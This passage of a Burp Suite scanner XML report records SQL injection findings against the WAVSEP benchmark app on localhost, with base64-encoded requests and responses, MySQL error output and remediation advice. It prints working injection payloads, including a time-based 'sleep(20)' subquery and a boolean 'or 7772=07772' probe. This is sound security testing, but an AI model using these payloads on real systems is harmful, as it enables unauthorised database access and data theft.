WVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6087394453689283584</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA0LUluamVjdGlvbkluVXBkYXRlLVN0cmluZy1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkzNg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTt0ZXh0dmFsdWUmIzM5OyYjMzk7IFdIRVJFIG1zZ2lkPTEmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTA0LUluamVjdGlvbkluVXBkYXRlLVN0cmluZy1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNCAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2235463607420562432</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>44723355 or 7772=07772</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkzNg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsyMDEwLTAxLTAxJiMzOTsmIzM5OyBBTkQgdXNlcklkPTEmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NT